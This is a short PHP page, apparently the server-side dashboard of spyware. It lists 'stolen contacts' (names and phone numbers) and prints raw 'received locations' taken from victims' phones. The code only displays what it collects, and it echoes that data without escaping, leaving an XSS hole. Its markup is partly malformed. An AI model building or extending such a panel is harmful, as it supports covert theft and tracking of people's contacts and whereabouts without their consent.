<?php
include 'contacts_repo.php';
include 'locations_repo.php';

$contacts_repo = ContactsRepository::getInstance();
$contacts = json_decode($contacts_repo->getContacts());
$locations_repo = LocationsRepository::getInstance();
$locations = json_decode($locations_repo->getLocations());
?>
<html>
    <head>
        <!-- Latest compiled and minified CSS -->
<link rel="stylesheet" href="css/bootstrap.min.css">

<!-- Optional theme -->
<link rel="stylesheet" href="css/bootstrap-theme.min.css">

<!-- Latest compiled and minified JavaScript -->
<script src="js/bootstrap.min.js"></script>
    </head>
<body>
<div class="panel panel-primary" style='width:50%'>
  <!-- Default panel contents -->
  <div class="panel-heading"><h1>Contactos robados</h1></div>
 
  <table class="table table-striped table-condensed table-bordered" >
      <tr>
          <th>Nombre</th><th>Telefonos</th>
      </tr>
       <?php foreach ($contacts->contacts as $contact): ?>
      <tr>
          <td><?php echo $contact->name?></td>
          <td>
              <ul class="list-group">
              <?php foreach ($contact->phones as $phone):?>
                  
                    <li class="list-group-item">
                      <span class="glyphicon  glyphicon-earphone"></span>
                      <?php echo $phone; ?>
                    </li>                  
              <?
              endforeach; 
              ?>
              </ul>
          </td>
      </tr>
    <?
            endforeach; ?>
  </table>
</div>
<!--<div id="contacts">
	<h1>Contactos recibidos</h1>
	
</div>-->
</div id="locations">
	<h1>Ubicaciones recibidas</h1>
	<?php echo $locations_repo->getLocations(); ?>
</div>
</body>
</html>